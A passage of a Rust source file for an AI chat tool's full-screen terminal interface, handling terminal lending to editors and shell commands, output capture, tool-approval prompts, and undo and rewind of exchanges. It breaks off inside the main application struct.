//! The full-screen UI. One loop on the main task owns the terminal and the
//! `RequestContext` while idle; a submitted line moves the context into a
//! spawned work task that runs the same REPL command path the line editor
//! would, and everything the turn says comes back through `UiMsg`s. The
//! transcript is redrawn from its sources on every frame, so a resize is
//! just another frame. A `!cmd` passthrough or an editor borrows the
//! terminal: the loop leaves the screen and runs the job synchronously on
//! its own thread, so nothing is drawn until the job returns.

mod bottom_pane;
mod cells;
mod composer;
mod events;
mod history;
mod keys;
mod queued;
mod redirect;
mod render;
mod sink;
mod terminal;
mod todo;
mod transcript;

use crate::config::{AppConfig, RequestContext};
use crate::events::{EventSink, NoticeKind, SubscriptionId};
use crate::prompt::{PromptAction, PromptAnswer, PromptMemory, PromptRequest};
use crate::repl::{EXIT_CANCEL_WAIT, EXIT_HOOK_DRAIN_TIMEOUT, is_command, run_repl_command};
use crate::supervisor::notification::NotificationQueue;
use crate::utils::{AbortSignal, create_abort_signal};
use anyhow::{Result, anyhow, bail};
use bottom_pane::{
    PaletteSnapshot, PaletteState, PaletteView, RewindState, RewindTarget, RewindView, SearchState,
    SearchView, View,
};
use cells::{
    AgentStatus, Cell, FoldedCall, JobStatus, LineCache, OutputTarget, RewindBarrier, ToolStatus,
    append_output,
};
use composer::{Composer, field_background};
use crossterm::event::{EventStream, KeyCode, KeyEvent, MouseButton, MouseEventKind};
use events::{Clock, FrameScheduler, SystemClock, TermInput};
use futures_util::StreamExt;
use history::ComposerHistory;
use keys::{Action, KeyContext, ModalKind, PopupKind, ViMode};
use queued::{
    QueuedLine, QueuedPreview, carry_over, reconcile_queue, remove_sent, take_user_messages,
};
use ratatui::Frame;
use ratatui::buffer::Buffer;
use ratatui::layout::{Constraint, Layout, Rect};
use ratatui::style::{Color, Modifier, Style};
use ratatui::text::{Line, Span};
use ratatui::widgets::{Paragraph, Widget};
use ratatui_textarea::TextArea;
use redirect::FdRedirect;
pub(crate) use render::plain_text;
use render::{RenderCache, Renderer};
use serde_json::Value;
use sink::{AgentOutcome, LendJob, TuiPrompter, TuiSink, UiMsg, unattended_answer};
use std::collections::VecDeque;
use std::io::IsTerminal;
use std::path::{Path, PathBuf};
use std::process::Stdio;
#[cfg(unix)]
use std::sync::OnceLock;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::mpsc;
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant};
use terminal::Screen;
use todo::TodoPanel;
use tokio::sync::mpsc::{UnboundedReceiver, UnboundedSender, unbounded_channel};
use tokio::task::JoinHandle;
use transcript::{Transcript, WHEEL_LINES};

/// Set while `run` owns the terminal; `RequestContext::ui_kind` reads it.
pub(crate) static TUI_ACTIVE: AtomicBool = AtomicBool::new(false);

pub(crate) fn active() -> bool {
    TUI_ACTIVE.load(Ordering::SeqCst)
}

/// The loop's inbox while `run` owns the terminal, for work elsewhere in
/// the process that needs the terminal in its normal modes, and the
/// thread the loop runs on: a lend from that thread would wait on itself.
static LENDER: Mutex<Option<(UnboundedSender<UiMsg>, std::thread::ThreadId)>> = Mutex::new(None);

/// A duplicate of the terminal taken before the screen was entered.
/// During a turn fds 1 and 2 are pointed at the capture pipe for the
/// whole process, so a child that should write to the terminal is given
/// this one explicitly. `None` when the duplicate could not be taken.
#[cfg(unix)]
static TTY_OUT: OnceLock<Option<std::os::fd::OwnedFd>> = OnceLock::new();

fn set_lender(tx: Option<(UnboundedSender<UiMsg>, std::thread::ThreadId)>) {
    *LENDER
        .lock()
        .unwrap_or_else(|poisoned| poisoned.into_inner()) = tx;
}

fn lender() -> Option<(UnboundedSender<UiMsg>, std::thread::ThreadId)> {
    LENDER
        .lock()
        .unwrap_or_else(|poisoned| poisoned.into_inner())
        .clone()
}

#[cfg(unix)]
fn remember_tty() {
    TTY_OUT.get_or_init(|| match dup_tty_out() {
        Ok(fd) => Some(fd),
        Err(err) => {
            warn!("Children lent the terminal will inherit the turn's output capture: {err}");
            None
        }
    });
}

/// Duplicates fd 1 close-on-exec: the copy is for the loop to hand out
/// through `TtyHandles::stdio`, never for a child to inherit on its own.
#[cfg(unix)]
fn dup_tty_out() -> std::io::Result<std::os::fd::OwnedFd> {
    use std::os::fd::FromRawFd;
    // SAFETY: fcntl with F_DUPFD_CLOEXEC takes no pointers; the result is checked.
    let fd = unsafe { libc::fcntl(libc::STDOUT_FILENO, libc::F_DUPFD_CLOEXEC, 3) };
    if fd == -1 {
        return Err(std::io::Error::last_os_error());
    }
    // SAFETY: `fd` was just created by fcntl and nothing else owns it.
    Ok(unsafe { std::os::fd::OwnedFd::from_raw_fd(fd) })
}

#[cfg(not(unix))]
fn remember_tty() {}

/// What a job lent the terminal spawns its child on.
pub(crate) struct TtyHandles {
    _private: (),
}

impl TtyHandles {
    /// A handle on the terminal for a child's stdout or stderr: the saved
    /// terminal descriptor where there is one, the inherited descriptor
    /// otherwise.
    pub(crate) fn stdio(&self) -> std::io::Result<Stdio> {
        #[cfg(unix)]
        if let Some(Some(tty)) = TTY_OUT.get() {
            return tty.try_clone().map(Stdio::from);
        }
        Ok(Stdio::inherit())
    }
}

const NOT_LENDING: &str = "the TUI is not lending its terminal";

/// Fails the way `lend_terminal` would, without a job. For callers that
/// write a file before opening the editor on it and must not leave that
/// file behind when the lend cannot happen.
pub(crate) fn ensure_terminal_lendable() -> Result<()> {
    if active() && lender().is_none() {
        bail!(NOT_LENDING);
    }
    Ok(())
}

/// Puts a notice in the transcript from anywhere in the process, the
/// loop's own thread included. False when no UI is running to show it.
pub(crate) fn notice(kind: NoticeKind, text: String) -> bool {
    lender().is_some_and(|(tx, _)| tx.send(UiMsg::Notice { kind, text }).is_ok())
}

/// Runs `job` with the terminal released to it (alternate screen left,
/// line discipline cooked), the way Ctrl+O hands it to the editor, and
/// blocks until the loop has taken the screen back. For the shell
/// passthrough and the file editors, which run on a work thread while
/// the UI owns the terminal; fails when no UI is lending it.
pub(crate) fn lend_terminal<T: Send + 'static>(
    job: impl FnOnce(&TtyHandles) -> T + Send + 'static,
) -> Result<T> {
    let Some((tx, loop_thread)) = lender() else {
        bail!(NOT_LENDING);
    };
    debug_assert_ne!(
        std::thread::current().id(),
        loop_thread,
        "lend_terminal on the loop thread would wait on itself"
    );
    let (reply_tx, reply_rx) = mpsc::channel();
    let job = LendJob(Box::new(move |tty: &TtyHandles| {
        // The asker gave up waiting; the result has nowhere to go.
        let _ = reply_tx.send(job(tty));
    }));
    if tx.send(UiMsg::LendTerminal(job)).is_err() {
        bail!(NOT_LENDING);
    }
    reply_rx
        .recv()
        .map_err(|_| anyhow!("the TUI went away before the lent terminal came back"))
}

/// Test-only harness hook: when set to `1`, `run` panics right after
/// entering the alternate screen so a pty test can check the panic hook
/// restores the terminal. Debug builds only; a release binary ignores it.
#[cfg(debug_assertions)]
const PANIC_AT_START_ENV: &str = "COYOTE_TUI_PANIC_AT_START";

/// Test-only harness hook: when set to `1`, a turn's work task sleeps
/// past `EXIT_CANCEL_WAIT` after the turn is done, ignoring the abort,
/// so a pty test can check the bounded exit path that leaves a turn
/// behind. Debug builds only; a release binary ignores it.
#[cfg(debug_assertions)]
const STUBBORN_TURN_ENV: &str = "COYOTE_TUI_STUBBORN_TURN";

/// Test-only harness hook: when set to `1`, the exit work panics once its
/// output is captured, so a pty test can check the panic's message
/// reaches the restored terminal. Debug builds only; a release binary
/// ignores it.
#[cfg(debug_assertions)]
const PANIC_AT_EXIT_ENV: &str = "COYOTE_TUI_PANIC_AT_EXIT";

/// How long the composer must have been untouched before a bare hotkey
/// counts as a modal answer, so a keystroke meant for the composer never
/// confirms a prompt that appeared under it.
const HOTKEY_IDLE: Duration = Duration::from_secs(1);
/// How close two idle Escs must come to open the rewind picker.
const REWIND_ESC_GAP: Duration = Duration::from_secs(1);
/// How long the UI waits on the exit work. The work itself waits
/// `EXIT_CANCEL_WAIT` on background tasks before it saves the session and
/// runs the finished hook, so the wait on it has to outlast that or a
/// task that ignores cancellation would cost the user the save.
const EXIT_TEARDOWN_WAIT: Duration = EXIT_CANCEL_WAIT.saturating_add(EXIT_HOOK_DRAIN_TIMEOUT);
const TOOL_OUTPUT_TAIL: usize = 20;
/// Most text one cell of late command output holds; a leftover child that
/// keeps writing sees its oldest lines dropped rather than the transcript grow.
const LATE_OUTPUT_LIMIT: usize = 64 * 1024;
/// Transcript rows a modal's question may not take from the frame, so the
/// narration being approved stays in view above it. A question that still
/// does not fit is clipped with a marker and cannot be approved until the
/// terminal is tall enough.
const TRANSCRIPT_MIN_ROWS: u16 = 4;
const INPUT_HINT: &str = "Enter = answer  Esc = cancel";
const SELECT_HINT: &str = "Up/Down = move  Enter = choose  Esc = cancel";
const CHECKBOX_HINT: &str = "Space = tick  Up/Down = move  Enter = answer  Esc = cancel";
/// The last row of a select, the entry the REPL's prompter appends too;
/// choosing it opens a free-text field in the list's place.
const CUSTOM_CHOICE_ROW: &str = crate::prompt::CUSTOM_MULTI_CHOICE_ANSWER_OPTION;
/// The confirm legend while part of the question is off screen: nothing
/// clipped may be approved, so the approving keys are not offered. Esc
/// leads so a narrow wrap never splits it from its meaning.
const CLIPPED_HINT: &str = "Esc = cancel  enlarge the terminal to answer";
/// How long the status row waits between two ticks of its elapsed time.
const STATUS_TICK: Duration = Duration::from_secs(1);
/// How long `flush_typeahead` waits for one more queued event, and how
/// many it drops at most, so a terminal that keeps talking cannot hold the
/// loop.
const TYPEAHEAD_GRACE: Duration = Duration::from_millis(5);
const TYPEAHEAD_LIMIT: usize = 50;

const DIM: Style = Style::new().add_modifier(Modifier::DIM);

/// The UI's own fixed colours. `no_color` keeps the attributes and drops
/// the colour, which is what `NO_COLOR` asks for.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum ChromeKind {
    Notice(NoticeKind),
    Error,
}

fn chrome_style(kind: ChromeKind, no_color: bool) -> Style {
    let (colour, style) = match kind {
        ChromeKind::Notice(NoticeKind::ToolWarning) => (Some(Color::Yellow), Style::new()),
        ChromeKind::Notice(NoticeKind::Routing) => (None, Style::new()),
        ChromeKind::Notice(_) => (None, DIM),
        ChromeKind::Error => (Some(Color::Red), Style::new()),
    };
    match colour {
        Some(colour) if !no_color => style.fg(colour),
        _ => style,
    }
}

/// The key legend under a yes/no question, naming what a bare Enter answers.
fn confirm_hint(default: bool, tool: bool) -> String {
    let enter = if default { "yes" } else { "no" };
    if tool {
        format!("y = yes  n = no  a = yes for this session  Enter = {enter}  Esc = cancel")
    } else {
        format!("y = yes  n = no  Enter = {enter}  Esc = cancel")
    }
}

struct ActiveGuard;

impl ActiveGuard {
    fn set(lender: UnboundedSender<UiMsg>) -> Self {
        set_lender(Some((lender, std::thread::current().id())));
        TUI_ACTIVE.store(true, Ordering::SeqCst);
        Self
    }
}

impl Drop for ActiveGuard {
    fn drop(&mut self) {
        TUI_ACTIVE.store(false, Ordering::SeqCst);
        set_lender(None);
    }
}

struct BusSubscription(SubscriptionId);

impl BusSubscription {
    fn new(sink: Arc<dyn EventSink>) -> Self {
        Self(crate::events::bus().subscribe(sink))
    }
}

impl Drop for BusSubscription {
    fn drop(&mut self) {
        crate::events::bus().unsubscribe(self.0);
    }
}

/// What one line produced on the work task.
#[derive(Debug, Default)]
pub(crate) struct TurnOutcome {
    /// `run_repl_command` asked to leave (`.exit`).
    pub(crate) exit: bool,
    pub(crate) error: Option<String>,
    /// Everything the turn printed to fds 1 and 2.
    pub(crate) captured: String,
}

fn late_output(tx: UnboundedSender<UiMsg>) -> impl Fn(String) + Send + 'static {
    move |text| {
        let _ = tx.send(UiMsg::Notice {
            kind: NoticeKind::Routing,
            text: render::plain_text(&text),
        });
    }
}

/// Drives a work-task future to completion on a blocking-pool thread.
/// The returned handle joins like a `tokio::spawn` one, but the future
/// may block its thread freely; see [`spawn_turn`] for why it must.
fn spawn_work<F>(future: F) -> JoinHandle<F::Output>
where
    F: std::future::Future + Send + 'static,
    F::Output: Send + 'static,
{
    let handle = tokio::runtime::Handle::current();
    tokio::task::spawn_blocking(move || handle.block_on(future))
}

/// Runs one line the way the REPL would, on its own task, with fds 1 and 2
/// captured. The context comes back with the outcome.
///
/// Runtime rule: the work task must never sit on a runtime worker. The
/// turn blocks its thread for the whole of a tool call and of a sync
/// prompt, and on the multi-thread runtime the time driver is serviced
/// by parked workers, never by the UI loop's `block_on` thread. A worker
/// blocked in the turn can hold the driver up with it, and every
/// timer-driven frame then waits for the turn to end. So the body runs on
/// the blocking pool under a nested `block_on` ([`spawn_work`]).
pub(crate) fn spawn_turn(
    mut ctx: RequestContext,
    abort: AbortSignal,
    line: String,
    ui: UnboundedSender<UiMsg>,
) -> JoinHandle<(RequestContext, TurnOutcome)> {
    spawn_work(async move {
        let guard = match FdRedirect::begin(late_output(ui.clone())) {
            Ok(guard) => Some(guard),
            Err(err) => {
                let _ = ui.send(UiMsg::Notice {
                    kind: NoticeKind::ToolWarning,
                    text: format!("Running the turn without output capture: {err}"),
                });
                None
            }
        };
        let result = Box::pin(run_repl_command(&mut ctx, abort, &line)).await;
        let captured = guard.map(FdRedirect::finish).unwrap_or_default();
        #[cfg(debug_assertions)]
        if std::env::var(STUBBORN_TURN_ENV).as_deref() == Ok("1") {
            std::thread::sleep(2 * EXIT_CANCEL_WAIT);
        }
        let outcome = match result {
            Ok(exit) => TurnOutcome {
                exit,
                error: None,
                captured,
            },
            Err(err) => TurnOutcome {
                exit: false,
                // The REPL's shape: message, then its causes.
                error: Some(crate::utils::pretty_error(&err)),
                captured,
            },
        };
        (ctx, outcome)
    })
}

/// The REPL's teardown on the work task, under the same runtime rule as
/// [`spawn_turn`]: settles background agents, exits the session (which
/// may ask to save it) and closes the agent bracket.
fn spawn_exit(
    mut ctx: RequestContext,
    abort: AbortSignal,
    ui: UnboundedSender<UiMsg>,
) -> JoinHandle<(RequestContext, Result<()>, String)> {
    spawn_work(async move {
        // Late output (a panic's message among it) reaches the UI the way
        // a turn's does instead of dying in a discarded pipe.
        let guard = match FdRedirect::begin(late_output(ui.clone())) {
            Ok(guard) => Some(guard),
            Err(err) => {
                let _ = ui.send(UiMsg::Notice {
                    kind: NoticeKind::ToolWarning,
                    text: format!("Leaving without output capture: {err}"),
                });
                None
            }
        };
        #[cfg(debug_assertions)]
        if std::env::var(PANIC_AT_EXIT_ENV).as_deref() == Ok("1") {
            panic!("{PANIC_AT_EXIT_ENV} requested a panic inside the exit work");
        }
        ctx.cancel_background_tasks_and_wait(EXIT_CANCEL_WAIT).await;
        let result = ctx.exit_session();
        ctx.top_level_agent_finished(result.as_ref().err(), Some(&abort));
        let captured = guard.map(FdRedirect::finish).unwrap_or_default();
        (ctx, result, captured)
    })
}

/// The footer's left half, read from the context only while the UI holds it.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub(crate) struct FooterInfo {
    who: Option<String>,
    model: String,
    session: Option<String>,
    agents: usize,
    jobs: usize,
}

impl FooterInfo {
    pub(crate) fn from_ctx(ctx: &RequestContext) -> Self {
        let who = ctx
            .agent
            .as_ref()
            .map(|agent| agent.name().to_string())
            .or_else(|| ctx.role.as_ref().map(|role| role.name().to_string()));
        let (agents, jobs) = ctx.supervisor.as_ref().map_or((0, 0), |supervisor| {
            let supervisor = supervisor.read();
            (supervisor.active_count(), supervisor.active_job_count())
        });
        Self {
            who,
            model: ctx.model.id(),
            session: ctx.session.as_ref().map(|s| s.name().to_string()),
            agents,
            jobs,
        }
    }

    fn text(&self) -> String {
        let mut parts = Vec::new();
        if let Some(who) = &self.who {
            parts.push(who.clone());
        }
        parts.push(self.model.clone());
        parts.push(
            self.session
                .clone()
                .unwrap_or_else(|| "no session".to_string()),
        );
        parts.push(format!("agents {}", self.agents));
        parts.push(format!("jobs {}", self.jobs));
        parts.join(" . ")
    }
}

struct TurnStatus {
    started: Instant,
    busy: Option<String>,
    thinking_since: Option<Instant>,
    tool: Option<String>,
    /// Index of the turn's first cell; tool output never merges into a
    /// cell before it.
    first_cell: usize,
    /// Whether a request reached the model: the first sign of a reply, or
    /// the busy indicator and stream end that the transports raise only
    /// once the request is on the wire. The session records an exchange
    /// for every such request, reply or not.
    requested: bool,
}

struct PendingPrompt {
    req: PromptRequest,
    reply: mpsc::Sender<PromptAnswer>,
    /// The text field of an input or password, or of a select whose
    /// custom row was chosen.
    field: Option<TextArea<'static>>,
    /// The row under the marker of a select or checkbox.
    cursor: usize,
    /// One flag per option of a checkbox, in the options' order.
    checked: Vec<bool>,
}

impl PendingPrompt {
    fn new(req: PromptRequest, reply: mpsc::Sender<PromptAnswer>) -> Self {
        let field = matches!(req.action, PromptAction::Input | PromptAction::Password)
            .then(|| new_field(req.action == PromptAction::Password));
        let checked = vec![false; req.options.len()];
        Self {
            req,
            reply,
            field,
            cursor: 0,
            checked,
        }
    }

    fn kind(&self) -> ModalKind {
        match self.req.action {
            PromptAction::Confirm => ModalKind::Confirm {
                default: self
                    .req
                    .default
                    .as_ref()
                    .and_then(serde_json::Value::as_bool)
                    .unwrap_or(true),
                tool: self.req.tool.is_some(),
            },
            PromptAction::Input => ModalKind::Input,
            PromptAction::Password => ModalKind::Password,
            PromptAction::Select => ModalKind::Select {
                custom_field_open: self.field.is_some(),
            },
            PromptAction::Checkbox => ModalKind::Checkbox,
        }
    }

    /// Whether the answer is a non-empty id of the tool call or job that
    /// asked, so a report that the call ended can take the question down.
    fn asked_by_call(&self, call_id: &str) -> bool {
        !call_id.is_empty() && self.req.call_id.as_deref() == Some(call_id)
    }

    fn asked_by_job(&self, job_id: &str) -> bool {
        !job_id.is_empty() && self.req.job_id.as_deref() == Some(job_id)
    }

    fn asked_by_agent(&self, agent_id: &str) -> bool {
        !agent_id.is_empty() && self.req.origin.agent_id.as_deref() == Some(agent_id)
    }

    /// The rows of a list modal: the options, plus the custom row of a
    /// select.
    fn list_len(&self) -> usize {
        match self.kind() {
            ModalKind::Select {
                custom_field_open: false,
            } => self.req.options.len() + 1,
            ModalKind::Checkbox => self.req.options.len(),
            _ => 0,
        }
    }

    fn move_cursor(&mut self, delta: i32) {
        let len = self.list_len();
        if len == 0 {
            return;
        }
        let last = len - 1;
        self.cursor = if delta < 0 {
            self.cursor.saturating_sub(delta.unsigned_abs() as usize)
        } else {
            self.cursor.saturating_add(delta as usize).min(last)
        };
    }

    fn toggle_cursor(&mut self) {
        if let Some(flag) = self.checked.get_mut(self.cursor) {
            *flag = !*flag;
        }
    }

    /// What Enter on a list answers: the select's row (or `None` for the
    /// custom row, which opens the field instead) or the ticked options.
    fn choice(&self) -> Option<PromptAnswer> {
        match self.kind() {
            ModalKind::Select {
                custom_field_open: false,
            } => self
                .req
                .options
                .get(self.cursor)
                .cloned()
                .map(PromptAnswer::Selected),
            ModalKind::Checkbox => Some(PromptAnswer::Checked(
                self.req
                    .options
                    .iter()
                    .zip(&self.checked)
                    .filter(|(_, ticked)| **ticked)
                    .map(|(option, _)| option.clone())
                    .collect(),
            )),
            _ => None,
        }
    }

    fn open_custom_field(&mut self) {
        self.field = Some(new_field(false));
    }

    /// What the field holds as an answer, by the kind that opened it: a
    /// select's custom text is a selection, the others are text.
    fn field_answer(&self) -> PromptAnswer {
        let text = self
            .field
            .as_ref()
            .map(|field| field.lines().join(" "))
            .unwrap_or_default();
        match self.req.action {
            PromptAction::Select => PromptAnswer::Selected(text),
            _ => PromptAnswer::Text(text),
        }
    }

    /// Who is asking: the tool, else the agent, else nobody in particular.
    fn origin_line(&self) -> Option<String> {
        if let Some(tool) = &self.req.tool {
            return Some(format!("tool: {tool}"));
        }
        self.req
            .origin
            .agent_id
            .as_ref()
            .map(|agent| format!("agent: {agent}"))
    }

    /// Rows the origin takes under the question. A confirm's middle row
    /// already carries it.
    fn origin_rows(&self) -> u16 {
        match self.kind() {
            ModalKind::Confirm { .. } => 0,
            _ => u16::from(self.origin_line().is_some()),
        }
    }

    /// The legend under the modal; a question that is clipped offers
    /// only Esc.
    fn hint(&self, clipped: bool) -> String {
        if clipped {
            return CLIPPED_HINT.to_string();
        }
        match self.kind() {
            ModalKind::Confirm { default, tool } => confirm_hint(default, tool),
            ModalKind::Input
            | ModalKind::Password
            | ModalKind::Select {
                custom_field_open: true,
            } => INPUT_HINT.to_string(),
            ModalKind::Select { .. } => SELECT_HINT.to_string(),
            ModalKind::Checkbox => CHECKBOX_HINT.to_string(),
        }
    }

    fn hint_lines(&self, width: u16, clipped: bool) -> Vec<Line<'static>> {
        render::plain_lines(&self.hint(clipped), width, DIM)
    }

    /// Rows reserved for the legend: enough for either wording, so the
    /// swap to the clipped one never changes the layout.
    fn hint_rows(&self, width: u16) -> u16 {
        row_count(self.hint_lines(width, false).len())
            .max(row_count(self.hint_lines(width, true).len()))
    }

    /// The question wrapped to `width`, every line of it: what the user
    /// approves is read from here, so none of it may be clipped away.
    /// Blank lines are dropped so a run of newlines cannot push the rest
    /// of the question past the pane.
    fn question_lines(&self, width: u16) -> Vec<Line<'static>> {
        // A tool controls the question's text; escape sequences in it
        // are stripped so none can move the cursor or hide a word.
        let question = render::plain_text(&self.req.question)
            .lines()
            .filter(|line| !line.trim().is_empty())
            .collect::<Vec<_>>()
            .join("\n");
        render::plain_lines(&question, width, Style::new().add_modifier(Modifier::BOLD))
    }

    /// Rows the question may take on a frame `height` tall: the status
    /// row, the footer, the modal's origin, middle and hint rows are
    /// fixed, and `TRANSCRIPT_MIN_ROWS` stay with the transcript.
    fn question_cap(&self, width: u16, height: u16) -> u16 {
        let fixed = 2
            + TRANSCRIPT_MIN_ROWS
            + self.hint_rows(width)
            + self.origin_rows()
            + self.middle_rows(width, height);
        height.saturating_sub(fixed).max(1)
    }

    /// Rows of the field, the confirm's tool line, or the list; a list
    /// longer than the frame allows (one question row, the fixed rows and
    /// the transcript's minimum kept) scrolls inside what it gets.
    fn middle_rows(&self, width: u16, height: u16) -> u16 {
        let fixed = 3 + TRANSCRIPT_MIN_ROWS + self.hint_rows(width) + self.origin_rows();
        row_count(self.list_len()).clamp(1, height.saturating_sub(fixed).max(1))
    }

    fn question_rows(&self, width: u16, height: u16) -> u16 {
        row_count(self.question_lines(width).len()).clamp(1, self.question_cap(width, height))
    }

    /// Whether the cap a frame `height` tall allows leaves the whole
    /// question on screen.
    fn question_fits_cap(&self, width: u16, height: u16) -> bool {
        self.question_fits_rows(width, self.question_cap(width, height))
    }

    /// Whether `rows` of the pane hold the whole question.
    fn question_fits_rows(&self, width: u16, rows: u16) -> bool {
        row_count(self.question_lines(width).len()) <= rows
    }

    /// Rows of the whole modal: question, origin, field or list, hint.
    fn rows(&self, width: u16, height: u16) -> u16 {
        self.question_rows(width, height)
            + self.origin_rows()
            + self.middle_rows(width, height)
            + self.hint_rows(width)
    }

    /// The question, origin, middle and legend rows inside the modal's
    /// `area` on a frame `frame` tall. A frame too short for the layout
    /// squeezes the question first; what it actually received is what
    /// answerability is judged on.
    fn areas(&self, area: Rect, frame: Rect) -> [Rect; 4] {
        Layout::vertical([
            Constraint::Min(1),
            Constraint::Length(self.origin_rows()),
            Constraint::Length(self.middle_rows(area.width, frame.height)),
            Constraint::Length(self.hint_rows(area.width)),
        ])
        .areas(area)
    }

    /// The list's rows as drawn, windowed around the cursor when it is
    /// taller than `visible`.
    fn list_lines(&self, visible: usize) -> Vec<Line<'static>> {
        let checkbox = self.kind() == ModalKind::Checkbox;
        let rows: Vec<String> = self
            .req
            .options
            .iter()
            .map(|option| render::plain_text(option).replace('\n', " "))
            .chain((!checkbox).then(|| CUSTOM_CHOICE_ROW.to_string()))
            .collect();
        let first = if self.cursor < visible {
            0
        } else {
            self.cursor + 1 - visible
        };
        rows.into_iter()
            .enumerate()
            .skip(first)
            .take(visible)
            .map(|(index, text)| {
                let marker = if index == self.cursor { ">" } else { " " };
                let line = if checkbox {
                    let tick = if self.checked[index] { "x" } else { " " };
                    format!("{marker} [{tick}] {text}")
                } else {
                    format!("{marker} {text}")
                };
                let style = if index == self.cursor {
                    Style::new().add_modifier(Modifier::BOLD)
                } else {
                    Style::new()
                };
                Line::from(Span::styled(line, style))
            })
            .collect()
    }
}

fn row_count(lines: usize) -> u16 {
    u16::try_from(lines).unwrap_or(u16::MAX)
}

/// The command word of a submitted line under the active prefix, in its
/// dot form.
fn command_word(line: &str, prefix: crate::config::CommandPrefix) -> Option<String> {
    prefix
        .normalize(line.trim())
        .and_then(|command| command.split_whitespace().next().map(str::to_string))
}

/// Whether a submitted command line is `.undo` under the active prefix.
fn is_undo(line: &str, prefix: crate::config::CommandPrefix) -> bool {
    command_word(line, prefix).as_deref() == Some(".undo")
}

/// Commands whose reply rewrites the exchange they follow instead of
/// opening one: `Session::add_message` appends to the last assistant
/// message for `.continue` and replaces it for `.regenerate`, so the
/// exchange `.undo` removes after either is the one before the command.
/// Every other command whose request reached the model (`.file`, `.run`,
/// `.starter`, `.prompt`, a macro, ...) recorded a fresh exchange the
/// way a prompt does.
const EXCHANGE_MODIFYING_COMMANDS: [&str; 2] = [".continue", ".regenerate"];

/// Whether the cell opened an exchange `.undo` would take back: a user
/// line or a command turn whose request reached the model, the command
/// not in `EXCHANGE_MODIFYING_COMMANDS`. A request that failed or was
/// interrupted before any reply still counts: the session keeps the user
/// message with an interrupted-response marker. A turn that failed
/// before the request (no API key, a usage bail on bare `.file`) or
/// never asks the model (`.info`) recorded nothing, so it is looked past.
fn opens_exchange(cell: &Cell, prefix: crate::config::CommandPrefix) -> bool {
    match cell {
        Cell::User { opened, .. } => *opened,
        Cell::Command { name, opened, .. } => {
            *opened
                && command_word(name, prefix)
                    .is_some_and(|word| !EXCHANGE_MODIFYING_COMMANDS.contains(&word.as_str()))
        }
        _ => false,
    }
}

/// Index of the cell that opened the exchange a `.undo` at `undo` takes
/// back: the latest opener before it, scanning back past any reply.
fn undo_opener(cells: &[Cell], undo: usize, prefix: crate::config::CommandPrefix) -> Option<usize> {
    cells[..undo]
        .iter()
        .rposition(|cell| opens_exchange(cell, prefix))
}

/// What stops the rewind picker at a command line, under the macros
/// enabled when it ran: a macro (`.<name>` or `.macro <name>`, not the
/// enable/disable toggles) stands for exchanges the transcript never
/// counted; `.session`, `.agent <name>`, `.fork`, `.undo`, `.edit
/// session` and the session and agent forms of `.exit`, `.empty` and
/// `.compress` leave the context holding history the transcript never
/// showed. A bare `.agent` only prints its usage.
fn rewind_barrier(
    line: &str,
    prefix: crate::config::CommandPrefix,
    macros: &[(String, String)],
) -> Option<RewindBarrier> {
    let line = prefix.normalize(line.trim())?;
    let mut words = line.split_whitespace();
    match (words.next()?, words.next()) {
        (".macro", Some(first)) => {
            (!matches!(first, "enable" | "disable")).then_some(RewindBarrier::Macro)
        }
        (".session" | ".fork" | ".undo", _) | (".agent", Some(_)) => Some(RewindBarrier::Session),
        (".exit", Some("session" | "agent"))
        | (".empty" | ".compress" | ".edit", Some("session")) => Some(RewindBarrier::Session),
        (word, _) => word
            .strip_prefix('.')
            .filter(|word| macros.iter().any(|(name, _)| name == word))
            .map(|_| RewindBarrier::Macro),
    }
}

/// Something the loop, not the app, has to do.
#[derive(Debug, PartialEq, Eq)]
pub(crate) enum Command {
    Submit(String),
    /// A prompt typed during a turn; the loop offers it to the running
    /// turn's model.
    Queue(String),
    /// A held line taken back into the composer: the loop withdraws the
    /// prompt from the running turn and offers the draft it displaced,
    /// each `None` when it was a command the turn never saw.
    Unqueue {
        held: Option<String>,
        draft: Option<String>,
    },
    Interrupt,
    Quit,
    Suspend,
    OpenEditor,
    Redraw,
    /// Take the chosen exchanges out of the session and the transcript
    /// and give the oldest one's prompt back to the composer.
    Rewind(RewindTarget),
}

fn new_textarea() -> TextArea<'static> {
    let mut textarea = TextArea::default();
    textarea.set_cursor_line_style(Style::new());
    textarea
}

/// A modal's one-line field; a password's shows a `*` per character.
fn new_field(masked: bool) -> TextArea<'static> {
    let mut field = new_textarea();
    if masked {
        field.set_mask_char('*');
    }
    field
}

/// Everything drawn, and the rules for changing it.
pub(crate) struct App {
    transcript: Transcript,
    todo: TodoPanel,
    composer: Composer,
    /// Lines entered while a turn ran, oldest first; the loop submits
    /// what the model did not get, one per turn, once it ends.
    queued: Vec<QueuedLine>,
    prompts: VecDeque<PendingPrompt>,
    /// Work waiting for the terminal to be released to it; the loop runs
    /// each after the step that queued it.
    lend_requests: Vec<LendJob>,
    turn: Option<TurnStatus>,
    /// The teardown task owns the context: nothing new can be submitted,
    /// interrupted or quit until it reports back.
    exiting: bool,
    /// Index of the first cell the exit work may add; what came after it
    /// is the exit's late output.
    exit_first_cell: usize,
    footer: FooterInfo,
    usage: String,
    last_keystroke: Option<Instant>,
    /// When the front prompt became the front; what Enter on a text
    /// field is settled against, so typing the answer does not postpone
    /// sending it.
    front_since: Option<Instant>,
    /// The area of the last frame drawn; what a modal's question cap and
    /// its clipped state are judged against between frames.
    frame_area: Option<Rect>,
    /// The rows the front prompt's question received in the last frame,
    /// None until it has been drawn.
    question_area: Option<Rect>,
    clock: Arc<dyn Clock>,
    frames: FrameScheduler,
    renderer: Renderer,
    /// The enabled macros as (name, description), refreshed with the
    /// context since a turn can enable or shadow one: the typed-command
    /// highlight accepts them as known and the palette lists them.
    macros: Vec<(String, String)>,
    view: View,
    /// What the palette lists while the context is away on a turn.
    palette_snapshot: PaletteSnapshot,
    /// Set by every edit of the composer; the next `refresh_palette`
    /// rebuilds the palette's rows and clears it. A palette closed by
    /// Esc stays closed until the draft changes again.
    palette_dirty: bool,
    history: ComposerHistory,
    /// Where submitted lines are recorded, None when the config keeps
    /// no shell history; the history then lasts the run.
    history_file: Option<PathBuf>,
    /// None under emacs bindings.
    vi_mode: Option<ViMode>,
    /// A `d` pressed in normal mode, waiting for the second.
    vi_pending_d: bool,
    /// When the last idle Esc was pressed; a second one within
    /// `REWIND_ESC_GAP` opens the rewind picker.
    last_esc: Option<Instant>,
    config: Arc<AppConfig>,
